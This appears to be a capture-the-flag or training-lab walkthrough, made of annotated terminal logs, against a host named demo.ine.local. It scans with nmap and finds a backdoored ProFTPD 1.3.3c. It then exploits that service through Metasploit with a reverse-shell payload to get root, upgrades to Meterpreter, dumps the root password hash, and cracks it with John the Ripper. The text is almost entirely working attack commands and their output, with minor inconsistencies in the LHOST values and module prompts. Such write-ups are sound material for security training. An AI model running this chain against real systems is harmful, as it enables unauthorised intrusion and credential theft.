# Dumping Linux Password Hashes

```bash
# Run Service detection
└─# nmap -sV 192.60.193.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 06:35 IST
Nmap scan report for demo.ine.local (192.60.193.3)
Host is up (0.000028s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c       <- ProFTPD 1.3.3c running on port 21!
MAC Address: 02:42:C0:3C:C1:03 (Unknown)
Service Info: OS: Unix

# Avsilable modules for ProFTPD 1.3.3c
└─# nmap --script vuln -p 21 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 06:49 IST
Nmap scan report for demo.ine.local (192.60.193.3)
Host is up (0.000060s latency).
# The target proftpd instllation has been running a backdoored version
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
MAC Address: 02:42:C0:3C:C1:03 (Unknown)
```

```bash
# Start Metasploit
msf6 auxiliary(analyze/crack_linux) > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload payload/cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.60.193.3
LHOST => 192.60.193.2

# bash session
/bin/bash -i
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
root@demo:/# 

root@demo:/# id
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

# Set the session background (Ctr + Z)
root@demo:/# ^Z
Background session 1? [y/N]  y
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > 

# Upgrade session
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > session -u 1
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.60.193.2:4433 
[*] Sending stage (1017704 bytes) to 192.60.193.3
[*] Meterpreter session 2 opened (192.60.193.2:4433 -> 192.60.193.3:44144) at 2025-07-22 07:13:45 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(unix/ftp/proftpd_133c_backdoor) >
```

```bash
# Another aproach
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > search hashdump
msf6 post(osx/gather/hashdump) > use post/linux/gather/hashdump
msf6 post(osx/gather/hashdump) > 

msf6 post(osx/gather/hashdump) > sessions

# Check session ID
Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         shell cmd/unix                           192.60.193.2:4444 -
                                                     > 192.60.193.3:5017
                                                     4 (192.60.193.3)
  2         meterpreter x86/li  root @ demo.ine.loc  192.60.193.2:4433 -
            nux                 al                   > 192.60.193.3:4414
                                                     4 (192.60.193.3)

# Set session id 2 (meterpreter session)
msf6 post(osx/gather/hashdump) > set SESSION 2
SESSION => 2

msf6 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash      <- Dumped root hash
[+] Unshadowed Password File: /root/.msf4/loot/20250722072220_default_192.60.193.3_linux.hashes_302343.txt
[*] Post module execution completed
```

```bash
# Find the flag
msf6 post(linux/gather/hashdump) > use auxiliary/analyze/crack_linux
msf6 auxiliary(analyze/crack_linux) > set SHA512 true
SHA512 => true

msf6 auxiliary(analyze/crack_linux) > run
[*] Running module against 192.60.193.3

[*] No md5crypt found to crack
[*] No descrypt found to crack
[*] No bsdicrypt found to crack
Created directory: /root/.john
[+] john Version Detected: 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP
[*] Wordlist file written out to /tmp/jtrtmp20250722-1562-93pmzt
[*] Checking sha512crypt hashes already cracked...
[*] Cracking sha512crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=1MG7CKkX --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt --wordlist=/tmp/jtrtmp20250722-1562-93pmzt --rules=single /tmp/hashes_sha512crypt_20250722-1562-wk8jy0
Using default input encoding: UTF-8
Will run 48 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
1g 0:00:00:03 DONE (2025-07-22 07:24) 0.2577g/s 1583p/s 1583c/s 1583C/s 1qwerty..afferent
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
[+] Cracked Hashes
==============

 DB ID  Hash Type    Username  Cracked Password  Method
 -----  ---------    --------  ----------------  ------
 1      sha512crypt  root      password <- flag         Single

[*] Auxiliary module execution completed
msf6 auxiliary(analyze/crack_linux) > 
```



